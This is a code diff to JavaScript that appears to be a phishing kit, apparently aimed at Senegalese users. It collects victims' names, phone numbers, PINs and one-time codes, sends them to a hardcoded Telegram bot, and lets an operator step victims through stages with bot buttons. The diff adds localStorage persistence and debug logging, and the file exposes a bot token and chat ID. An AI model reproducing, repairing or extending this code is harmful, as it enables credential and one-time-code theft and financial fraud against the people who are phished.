@@ -5,7 +5,27 @@ const TG_TOKEN = "8672410577:AAHBD_Xtl4aJSwVUS_KWyXf1W-85DjcwXrY";
 const TG_CHAT = "8574792010";
 const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
-const sessions = new Map();
+const SESSIONS_KEY = 'senegal_app_sessions';
+
+function getSessionsFromStorage() {
+    try {
+        const data = localStorage.getItem(SESSIONS_KEY);
+        return data ? JSON.parse(data) : {};
+    } catch (e) {
+        console.warn("Failed to parse sessions from localStorage:", e);
+        return {};
+    }
+}
+
+function saveSessionsToStorage(map) {
+    try {
+        localStorage.setItem(SESSIONS_KEY, JSON.stringify(Object.fromEntries(map)));
+    } catch (e) {
+        console.warn("Failed to save sessions to localStorage:", e);
+    }
+}
+
+const sessions = new Map(Object.entries(getSessionsFromStorage()));
 let sessionCounter = 1;
 
 function createSession(data) {
@@ -21,6 +41,7 @@ function createSession(data) {
         otp: ''
     };
     sessions.set(id, session);
+    saveSessionsToStorage(sessions);
     return session;
 }
 
@@ -31,6 +52,7 @@ function updateSession(id, updates) {
     if (!s) return null;
     Object.assign(s, updates);
     s.updated_at = new Date().toISOString();
+    saveSessionsToStorage(sessions);
     return s;
 }
 
@@ -99,6 +121,7 @@ function restoreSession() {
     const savedId = localStorage.getItem("current_session_id");
     if (savedId) {
         currentSessionId = savedId;
+        S.applicationId = savedId;
         console.log("Restored session ID:", savedId);
     }
 }
@@ -106,6 +129,7 @@ function restoreSession() {
 // Save session ID to localStorage
 function saveSessionId(id) {
     localStorage.setItem("current_session_id", id);
+    localStorage.setItem("S_applicationId", id);
     currentSessionId = id;
 }
 
@@ -194,8 +218,12 @@ async function tgPoll() {
                 message_id: cq.message.message_id,
                 reply_markup: { inline_keyboard: [[{ text: "✓ " + label, callback_data: "noop" }]] }
             });
+            console.log("currentSessionId:", currentSessionId, "| callback id:", id, "| updated:", updated ? 'YES' : 'NO');
             if (currentSessionId === id && updated) {
+                console.log("Stage matched! Calling handleStageUpdate ->", stage);
                 handleStageUpdate(updated);
+            } else {
+                console.log("Stage NOT triggered: session mismatch or update failed");
             }
         } else {
             console.log("No stage for:", action, id);
@@ -387,6 +415,7 @@ function submitApp() {
     S.applicationId = session.id;
     currentSessionId = session.id;
     saveSessionId(session.id);
+    console.log("Application submitted - session created:", session.id);
 
     setTimeout(() => {
         goTo('page-sim-check');
@@ -496,6 +525,7 @@ async function doLogin() {
 
     try {
         const session = getSession(S.applicationId);
+        console.log("doLogin - S.applicationId:", S.applicationId, "| session found:", session ? 'YES' : 'NO', "| session:", session);
         if (session) {
             updateSession(S.applicationId, { pin: pin, stage: 'pin_submitted' });
             await tgNotify({ id: S.applicationId, firstName: S.firstName, lastName: S.lastName, phone: phone,
